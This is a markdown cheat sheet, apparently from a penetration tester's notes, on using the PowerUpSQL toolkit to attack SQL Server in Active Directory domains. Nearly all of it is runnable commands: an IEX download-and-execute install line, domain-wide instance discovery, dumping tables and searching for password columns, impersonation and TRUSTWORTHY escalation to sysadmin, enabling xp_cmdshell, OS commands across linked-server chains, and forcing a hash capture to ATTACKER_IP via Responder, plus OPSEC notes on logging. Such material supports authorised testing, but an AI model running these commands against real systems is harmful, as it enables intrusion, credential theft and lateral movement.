# PowerUpSQL

**Tags:** `#powerupsql` `#mssql` `#sqlserver` `#activedirectory` `#postexploitation` `#privesc` `#windows` `#powershell`

PowerShell toolkit for MSSQL auditing and exploitation in Active Directory environments. Discovers SQL Server instances across the domain via SPNs, tests access with current credentials, audits configurations, and chains linked server attacks for privilege escalation. Essential for SQL Server privilege escalation paths in AD environments.

**Source:** https://github.com/NetSPI/PowerUpSQL
**Install:** `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')` or import from local clone

```powershell
# Import
Import-Module .\PowerUpSQL.ps1

# Find and test all SQL instances in the domain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
```

> [!note] **PowerUpSQL vs mssqlclient** — PowerUpSQL runs on a Windows foothold inside the domain — it uses domain SPN enumeration to discover SQL instances and tests access with the current user's token automatically. mssqlclient is for Linux-based targeted exploitation once you already know the target. Use PowerUpSQL for discovery and domain-wide SQL privilege escalation chains.

---

## Discovery — Finding SQL Instances

```powershell
# Find all SQL Server SPNs in the domain (unauthenticated domain query)
Get-SQLInstanceDomain

# Find instances and test connectivity with current user
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded

# Find instances accessible to current user (non-public access)
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"}

# Scan local subnet for SQL instances (no domain required)
Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24

# Check a specific instance
Get-SQLConnectionTest -Instance "MSSQL01\SQLEXPRESS"
```

---

## Reconnaissance

```powershell
# Server info
Get-SQLServerInfo -Instance "MSSQL01"

# All databases
Get-SQLDatabase -Instance "MSSQL01"

# All tables in a database
Get-SQLTable -Instance "MSSQL01" -DatabaseName "targetdb"

# All columns
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -TableName "users"

# Search columns by keyword (find password fields)
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "pass"
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "cred"
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "secret"

# Dump data from a specific table
Get-SQLQuery -Instance "MSSQL01" -Query "SELECT * FROM targetdb.dbo.users"

# List all logins
Get-SQLServerLogin -Instance "MSSQL01"

# List sysadmin accounts
Get-SQLServerRoleMember -Instance "MSSQL01" -RolePrincipalName "sysadmin"
```

---

## Privilege Check & Escalation

```powershell
# Check current user's privileges
Get-SQLServerPriv -Instance "MSSQL01"

# Check for impersonatable logins
Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Verbose

# Exploit login impersonation → escalate to sysadmin
Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Exploit -Verbose

# Check for TRUSTWORTHY databases (db_owner → sysadmin path)
Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Verbose
Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Exploit -Verbose

# Full privilege audit
Invoke-SQLAudit -Instance "MSSQL01" -Verbose

# Check for xp_cmdshell or if it can be enabled
Invoke-SQLAuditPrivXpCmdshell -Instance "MSSQL01" -Verbose
Invoke-SQLAuditPrivXpCmdshell -Instance "MSSQL01" -Exploit -Verbose
```

---

## OS Command Execution

```powershell
# Execute OS command via xp_cmdshell (requires sysadmin)
Invoke-SQLOSCmd -Instance "MSSQL01" -Command "whoami" -Verbose

# Run on all accessible domain instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Invoke-SQLOSCmd -Command "whoami"

# Enable xp_cmdshell manually
Get-SQLQuery -Instance "MSSQL01" -Query "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
```

---

## Linked Server Enumeration & Attack

```powershell
# Find linked servers for a given instance
Get-SQLServerLink -Instance "MSSQL01" -Verbose

# Crawl all linked server chains from accessible instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Get-SQLServerLinkCrawl -Verbose

# Execute query across linked server chain
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Query "SELECT @@version" -Verbose

# OS command via linked server chain (if sysadmin at end of chain)
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Query "EXEC xp_cmdshell 'whoami'" -Verbose

# Direct linked server query
Get-SQLQuery -Instance "MSSQL01" -Query "EXEC ('xp_cmdshell ''whoami''') AT [MSSQL02]"
```

---

## Credential Capture — UNC Path Coercion

```powershell
# Force SQL Server to authenticate to your Responder listener (capture service account hash)
Get-SQLServiceAccountPwHashes -Instance "MSSQL01" -CaptureIP ATTACKER_IP -Verbose
```

```bash
# Kali side — catch with Responder
sudo responder -I tun0
```

---

## Database Content Search

```powershell
# Search all accessible instances for tables containing keywords
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Get-SQLColumnSampleDataThreaded -Keywords "password,credential,secret,key,token" -Verbose

# Search specific instance
Get-SQLColumnSampleData -Instance "MSSQL01" -Keywords "password" -Verbose -SampleSize 5
```

---

## Full Domain Audit One-Liner

```powershell
# Discover, test, and audit all domain SQL instances
Get-SQLInstanceDomain |
  Get-SQLConnectionTestThreaded -Verbose |
  Where-Object {$_.Status -eq "Accessible"} |
  Invoke-SQLAudit -Verbose |
  Out-GridView
```

---

## OPSEC Notes

- SPN enumeration via LDAP — generates standard domain LDAP queries, low noise
- Connection tests generate SQL Server audit events and Windows auth events on each target
- `xp_cmdshell` commands logged in SQL Server error logs and Windows Application event log
- Linked server crawl hits multiple SQL instances — generates auth events across hosts

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
